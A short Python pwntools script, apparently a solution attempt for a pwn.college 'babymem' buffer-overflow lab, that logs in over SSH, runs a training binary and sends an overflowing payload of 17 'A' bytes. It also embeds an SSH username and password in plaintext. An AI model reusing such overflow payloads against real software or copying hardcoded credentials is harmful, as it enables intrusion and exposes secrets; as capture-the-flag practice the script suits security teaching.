from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../csec")

context.log_level = 'debug'
p = s.process("./babymem_level10_teaching1")
# p = process('./babymem_level9_testing2')

p.sendlineafter(b'Payload size: ',b'1000')
pay = b'A'*17
p.sendafter(b'bytes)!\n',pay)
p.interactive()